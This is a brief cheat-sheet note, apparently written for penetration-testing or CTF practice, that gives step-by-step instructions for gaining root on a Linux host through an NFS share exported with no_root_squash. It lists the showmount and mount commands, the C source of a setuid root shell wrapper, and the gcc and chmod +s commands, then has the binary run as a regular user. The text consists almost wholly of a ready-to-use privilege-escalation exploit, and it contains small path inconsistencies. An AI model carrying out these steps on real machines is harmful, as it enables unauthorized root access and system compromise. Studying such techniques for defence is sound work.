[] NFS => Network Shared Folders:
	- cat /etc/export file if no_root_squash option is enabled you can get a root shell

	1. showmount -e <target_ip> => to list the target shared folders
	2. create a folder /tmp/sharedfolder
	3. cd /tmp/folder
	4. mount -o rw <target_ip>:/target_shared_folder /tmp/sharedfolder
	5. create a file.c 
		`int main(){
		setgid(0);
		setuid(0);
		system("/bin/bash");
		return 0;
		}`
	6. compile the file.c => `gcc file.c -o file -w`
	7. change the permission => `chmod +s file`
	8. run the file from the target machine using a regular user and that's it, you are a root now
